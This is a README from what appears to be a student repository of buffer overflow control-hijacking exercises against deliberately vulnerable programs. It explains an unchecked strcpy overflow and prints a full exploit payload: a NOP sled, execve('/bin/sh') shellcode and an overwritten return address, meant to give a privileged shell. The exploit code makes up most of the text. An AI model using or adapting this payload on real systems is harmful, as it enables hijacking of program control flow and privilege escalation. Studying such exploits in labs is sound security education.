# Control Hijacking Attack
In this repository, I implemented some buffer overflow controlling hijacking attacks which all are described down below. You can find Executable Linkable Formats(ELF) of these
programs named "prog_vuln#" and corresponding inputs for each of them named "expoit#.sh" which were designed to overflow the buffers of program and rewrite some specific addresses
of the memory to change control flow of the program which will result in getting shell with sudo privileged.
## prog_vuln1
To perform this attack I used vulnerability of strcpy() function which does not check the length of strings before copy. As a result it will be possible to write some specific 
addresses in the stack and change the pointer to the start of shell code. You can see related commands in the following.
```
$(python -c 'print("\x90"*63 +
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x0
8\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "w"
*500 + "\x90\xf0\xff\xbf")')
```
